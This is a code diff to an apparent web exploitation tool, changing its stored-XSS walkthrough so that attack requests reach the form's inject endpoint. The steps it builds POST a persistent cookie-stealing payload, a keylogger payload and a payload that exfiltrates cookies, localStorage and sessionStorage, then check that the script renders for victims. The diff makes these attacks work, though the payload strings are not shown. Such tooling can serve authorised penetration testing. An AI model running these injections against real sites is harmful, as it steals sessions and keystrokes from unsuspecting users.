@@ -3754,6 +3754,18 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
 
     elif etype == "stored_xss":
         render = ei.get("render_path", "/")
+        # Stored XSS has TWO paths: the INJECT endpoint (where we POST
+        # the payload) and the RENDER endpoint (where victims see it).
+        # The scanner sets finding.test_url to the render URL so the
+        # report's replay link points at the visible result — but the
+        # walkthrough needs to POST at the inject endpoint, or every
+        # payload lands on the render page where no form handler
+        # exists. Reconstruct inject_url from base_url + exploit_info.path.
+        inject_path = ei.get("path", "")
+        if inject_path:
+            inject_url = base_url.rstrip("/") + inject_path
+        else:
+            inject_url = target
         def _sxss_verify(r: ExploitResult):
             if "<script>" in r.response_body.lower() or "onerror=" in r.response_body.lower():
                 r.success = True
@@ -3791,28 +3803,29 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Beacon (confirm render without stealing)",
-             "request": _post(target, {param: _beacon}),
-             "note": "Harmless ping — lets you confirm the XSS fires before "
-                     "pushing sensitive payloads.",
+             "request": _post(inject_url, {param: _beacon}),
+             "note": f"Harmless ping — POSTs to {inject_path or '(origin)'} "
+                     "so you can confirm the XSS fires at "
+                     f"{render} before pushing sensitive payloads.",
              "validate": lambda r: setattr(
                  r, 'evidence', f"POST returned HTTP {r.status_code}")},
             {"title": "Inject persistent cookie-stealing payload",
-             "request": _post(target, {param: _cookie_steal}),
+             "request": _post(inject_url, {param: _cookie_steal}),
              "warning": "Injects a persistent payload",
              "validate": lambda r: setattr(
                  r, 'evidence', f"POST returned HTTP {r.status_code}")},
             {"title": "Inject persistent keylogger payload",
-             "request": _post(target, {param: _keylog}),
+             "request": _post(inject_url, {param: _keylog}),
              "warning": "Injects persistent keylogger (buffers + batches keys)",
              "risk": "CRITICAL"},
             {"title": "Inject storage exfiltration payload",
-             "request": _post(target, {param: _storage_dump}),
+             "request": _post(inject_url, {param: _storage_dump}),
              "warning": "Dumps cookies + localStorage + sessionStorage to /s",
              "risk": "CRITICAL"},
             {"title": "Verify payload renders",
              "request": _get(base_url.rstrip("/") + render),
              "validate": _sxss_verify,
-             "note": "Checks if injected script appears on the render page"},
+             "note": f"Fetches {render} to confirm the injected script appears"},
         ]
 
     elif etype == "lfi":
